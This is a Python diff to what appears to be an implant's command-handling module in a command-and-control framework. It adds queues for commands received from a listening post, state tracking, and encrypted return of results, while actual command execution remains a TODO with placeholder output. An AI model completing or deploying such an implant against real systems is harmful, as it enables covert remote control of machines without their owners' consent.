@@ -6,6 +6,22 @@ from lib import transmit
 from lib.crypto import asymmetric
 
 
+def _get_cmd_index(component, cmd_txid, type):
+    if type == "cmd":
+        cmd_index = next(
+            (index for (index, d) in enumerate(component.cmd_queue) if d["txid"] == cmd_txid),
+            None)
+    elif type == "processing":
+        cmd_index = next(
+            (index for (index, d) in enumerate(component.cmd_processing_queue) if d["txid"] == cmd_txid),
+            None)
+    else:
+        cmd_index = next(
+            (index for (index, d) in enumerate(component.cmd_done_queue) if d["txid"] == cmd_txid),
+            None)
+    return cmd_index
+
+
 def init(frame, component):
     """
     Initialization frame received, sending self manifest
@@ -46,20 +62,36 @@ def getcmd(frame, component):
     component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['lpk']))
     component.current_private_key = component.initial_private_key
     component.current_public_key = component.initial_public_key
+    commands = frame['args'][0]
+    cmd_txids = []
+    for command in commands:
+        command['state'] = "RECEIVED"
+        event_history = {"timestamp": time(), "event": "RECEIVED", "component": component.component_id}
+        command['history'].append(event_history)
+        cmd_txids.append(command['txid'])
+        component.cmd_queue.append(command)
 
-    if len(frame['args'][0]) == 0:
-        # We got no commands, go to sleep
-        return 0
-    else:
-        for command in frame['args'][0]:
-            component.cmd_queue.append(command)
-            # TODO: Execute the commands
-    return None
+    return 0
 
 
 def send_cmd_output(component):
+    done_commands = []
     for command in component.cmd_done_queue:
-        print("command")
+        cmd_index = _get_cmd_index(component, command['txid'], "done")
+        command['state'] = "RETURNING"
+        event_history = {"timestamp": time(), "event": "RETURNING", "component": component.component_id}
+        command['history'].append(event_history)
+        done_commands.append(copy(command))
+        del component.cmd_done_queue[cmd_index]
+    data = {'component_id': component.component_id, "cmd": "fcmd", "args": [done_commands, {"ipk": component.initial_public_key._public_key}]}
+    instruction_frame = instructions.create_instruction_frame(data)
+    request_frame = transmit.cook_transmit_frame(component, instruction_frame)
+    component.transport.send_data(request_frame)
+    del done_commands
+    sleep(5)
+    reply = component.transport.recv_data()
+    uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, reply).decode('utf-8'))
+    return uncooked_frame
 
 
 def import_transport_for_implant(component, transport_config):
@@ -110,6 +142,7 @@ def retrieve_output(component):
 def relay_init_frame(component, reply):
     try:
         component.transport.send_data(reply)
+        sleep(5)
         init_response = component.transport.recv_data()
         uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, init_response).decode('utf-8'))
         return uncooked_frame
@@ -124,9 +157,50 @@ def request_instructions(component):
         instruction_frame = instructions.create_instruction_frame(data)
         request_frame = transmit.cook_transmit_frame(component, instruction_frame)
         component.transport.send_data(request_frame)
+        sleep(5)
         reply = component.transport.recv_data()
         uncooked_frame = ast.literal_eval(transmit.uncook_transmit_frame(component, reply).decode('utf-8'))
         return uncooked_frame
     except Exception as e:
         component.logging.log(f"Critical [{type(e).__name__}] when requesting instructions: {e}",
                               level="critical", source=f"lib.yadro")
+
+
+def process_commands(component):
+    component.logging.log(f"Preparing commands for execution", level="debug")
+    for command in component.cmd_queue:
+        if command['state'] == "RECEIVED":
+            # Move it from the cmd_queue to cmd_processing_queue
+            cmd_index = _get_cmd_index(component, command['txid'], "cmd")
+            command['state'] = "PROCESSING"
+            event_history = {"timestamp": time(), "event": "EXECUTING", "component": component.component_id}
+            command['history'].append(event_history)
+            component.cmd_processing_queue.append(command)
+            component.cmd_queue.pop(cmd_index)
+            # TODO: Actually execute the command, move it from cmd_processing_queue to cmd_done_queue, relay output
+
+
+def ack_cmds(frame, component):
+    component.current_lp_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['lpk']))
+    component.current_private_key = component.initial_private_key
+    component.current_public_key = component.initial_public_key
+    command_txids = frame['args'][0]
+    for command in command_txids:
+        cmd_index = _get_cmd_index(component, command['txid'], "done")
+        del component.cmd_done_queue[cmd_index]
+    return 0
+
+
+def run_instructions(component):
+    for command in component.cmd_processing_queue:
+        try:
+            command['state'] = "EXECUTED"
+            event_history = {"timestamp": time(), "event": "EXECUTED", "component": component.component_id}
+            command['history'].append(event_history)
+            component.logging.log(f"Executed {command['txid']}", level="info", source="lib.yadro")
+            component.logging.log(f"Executed {command}", level="debug", source="lib.yadro")
+            # TODO: Actually execute the command here and retrieve the output, see #2
+            command['output'] = "> ayyylmao"  # TODO: FIXME
+        except Exception as e:
+            component.logging.log(f"Critical [{type(e).__name__}] when requesting command: {e}",
+                                  level="critical", source=f"lib.yadro")
